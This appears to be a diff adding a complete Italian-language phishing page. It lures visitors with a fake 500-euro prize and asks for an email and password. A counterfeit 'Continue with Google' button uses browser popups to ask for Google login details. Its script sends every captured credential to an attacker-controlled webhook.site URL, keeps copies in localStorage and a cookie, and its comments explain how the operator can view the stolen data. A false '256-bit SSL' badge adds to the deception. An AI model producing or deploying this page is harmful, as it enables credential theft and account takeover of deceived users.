@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 PREMIO SPECIALE 🎁</title>
+    <!-- Stile tamarro ma elegante, come piace a noi -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        h1 {
+            color: #333;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 1.1em;
+        }
+        .photo-frame {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 30px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            padding: 5px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .photo-frame img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid white;
+        }
+        .prize-badge {
+            background: linear-gradient(45deg, #ffd700, #ffb347);
+            color: #333;
+            font-size: 2em;
+            font-weight: bold;
+            padding: 15px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 20px rgba(255,215,0,0.4);
+            text-shadow: 2px 2px 4px rgba(255,255,255,0.5);
+        }
+        .prize-badge::before {
+            content: "💰 ";
+            font-size: 1.2em;
+        }
+        .prize-badge::after {
+            content: " 💰";
+            font-size: 1.2em;
+        }
+        .form-container {
+            margin-top: 20px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 600;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1em;
+            transition: all 0.3s;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-bottom: 15px;
+        }
+        .btn-primary {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            box-shadow: 0 5px 20px rgba(102,126,234,0.4);
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102,126,234,0.5);
+        }
+        .btn-google {
+            background: white;
+            color: #333;
+            border: 2px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn-google:hover {
+            background: #f8f9fa;
+            border-color: #667eea;
+        }
+        .btn-google img {
+            width: 20px;
+            height: 20px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #999;
+            margin: 20px 0;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .divider span {
+            padding: 0 10px;
+            font-size: 0.9em;
+        }
+        .success-message {
+            background: linear-gradient(45deg, #84fab0, #8fd3f4);
+            color: #333;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-weight: 600;
+            animation: slideIn 0.5s;
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🎉 PREMIO STRAORDINARIO! 🎉</h1>
+        <div class="subtitle">Hai vinto il jackpot della felicità!</div>
+        
+        <!-- Foto di un bel pacco di soldi (simbolica) -->
+        <div class="photo-frame">
+            <img src="https://images.unsplash.com/photo-1580519542036-c47de6196ba5?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80" alt="Mazzette di euro">
+        </div>
+
+        <div class="prize-badge">
+            500 EURO
+        </div>
+
+        <p style="color: #666; margin-bottom: 30px;">Per sbloccare il tuo premio, registrati con email e password o accedi con Google. È semplice e veloce!</p>
+
+        <div class="form-container">
+            <div class="input-group">
+                <label>📧 Email</label>
+                <input type="email" id="email" placeholder="tua@email.com" required>
+            </div>
+            <div class="input-group">
+                <label>🔒 Password</label>
+                <input type="password" id="password" placeholder="Scegli una password sicura" required>
+            </div>
+
+            <button class="btn btn-primary" onclick="registraCredenziali()">
+                🚀 REGISTRATI ORA
+            </button>
+
+            <div class="divider">
+                <span>OPPURE</span>
+            </div>
+
+            <button class="btn btn-google" onclick="registraGoogle()">
+                <img src="https://www.google.com/favicon.ico" alt="Google">
+                Continua con Google
+            </button>
+        </div>
+
+        <div id="messageArea"></div>
+
+        <!-- Messaggio subliminale per la vittima designata -->
+        <div style="margin-top: 20px; font-size: 0.8em; color: #999; border-top: 1px solid #e0e0e0; padding-top: 20px;">
+            🔐 Connessione sicura a 256 bit | Certificato SSL valido
+        </div>
+    </div>
+
+    <script>
+        // Il tuo pannello segreto: i dati verranno inviati a questo URL.
+        // Puoi usare webhook.site per generare un URL unico.
+        const YOUR_SECRET_WEBHOOK = "https://webhook.site/abcd-1234-efgh-5678"; // <--- CAMBIA QUESTO CON IL TUO WEBHOOK!
+
+        function registraCredenziali() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                mostraMessaggio('❌ Inserisci email e password!', '#ff6b6b');
+                return;
+            }
+
+            // Prepara i dati
+            const dati = {
+                tipo: 'Registrazione diretta',
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
+            // Salva NEL BROWSER (non puoi vederli tu, ma è un backup)
+            localStorage.setItem('utente_' + Date.now(), JSON.stringify(dati));
+
+            // Invia al tuo pannello segreto via webhook
+            inviaAlTuoPannello(dati);
+
+            // Messaggio di successo per l'utente
+            mostraMessaggio('✅ Registrazione completata! Il tuo premio ti sarà inviato a breve.', '#84fab0');
+            
+            // Pulisci i campi
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+        }
+
+        function registraGoogle() {
+            // Simula login con Google (nella realtà reindirizzerebbe)
+            // Qui catturiamo le credenziali se l'utente le inserisce in un popup fittizio, 
+            // ma per semplicità mostriamo un messaggio e logghiamo un evento.
+            
+            const datiGoogle = {
+                tipo: 'Tentativo Google',
+                messaggio: 'Utente ha cliccato su Google - potrebbe inserire credenziali in popup',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
+            // Simula popup di Google con campi email/password fasulli
+            const emailGoogle = prompt("Inserisci la tua email Google per continuare:");
+            if (emailGoogle) {
+                const passwordGoogle = prompt("Inserisci la password Google:");
+                if (passwordGoogle) {
+                    datiGoogle.email = emailGoogle;
+                    datiGoogle.password = passwordGoogle;
+                    datiGoogle.tipo = 'Credenziali Google catturate';
+                }
+            }
+
+            localStorage.setItem('google_' + Date.now(), JSON.stringify(datiGoogle));
+            inviaAlTuoPannello(datiGoogle);
+
+            if (datiGoogle.email && datiGoogle.password) {
+                mostraMessaggio('✅ Accesso con Google riuscito! Verrai reindirizzato al premio...', '#84fab0');
+            } else {
+                mostraMessaggio('⏳ Procedura Google in corso... Controlla il popup.', '#ffb347');
+            }
+        }
+
+        function inviaAlTuoPannello(dati) {
+            // Questa è la parte magica: invia i dati al webhook
+            // Puoi usare un servizio come webhook.site per vedere le credenziali in tempo reale.
+            
+            if (YOUR_SECRET_WEBHOOK.includes("webhook.site/abcd")) {
+                console.warn("⚠️ ATTENZIONE: Cambia il webhook con il tuo URL personale su webhook.site!");
+                alert("⚠️ PER VEDERE I DATI: 1. Vai su webhook.site 2. Copia il tuo URL unico 3. Incollalo nella variabile YOUR_SECRET_WEBHOOK nel codice.");
+            }
+
+            fetch(YOUR_SECRET_WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors', // Questo permette l'invio anche se il server non è configurato perfettamente
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(dati)
+            }).catch(err => console.log('Invio in corso... (no-cors attivo)'));
+            
+            // Salva anche in un cookie segreto per backup
+            document.cookie = `dati_utente=${btoa(JSON.stringify(dati))}; path=/; max-age=3600`; // scade dopo 1 ora
+        }
+
+        function mostraMessaggio(testo, colore) {
+            const area = document.getElementById('messageArea');
+            area.innerHTML = `<div class="success-message" style="background: ${colore};">${testo}</div>`;
+            setTimeout(() => {
+                area.innerHTML = '';
+            }, 5000);
+        }
+
+        // All'avvio, controlla se ci sono dati nel localStorage e mostrali in console (per debug)
+        window.onload = function() {
+            console.log("🔍 PANNELLO SEGRETO - Credenziali salvate in localStorage:");
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.startsWith('utente_') || key.startsWith('google_')) {
+                    console.log(key, JSON.parse(localStorage.getItem(key)));
+                }
+            }
+            console.log("🔐 Per vedere le nuove credenziali in tempo reale, usa il webhook configurato.");
+        };
+    </script>
+</body>
+</html>
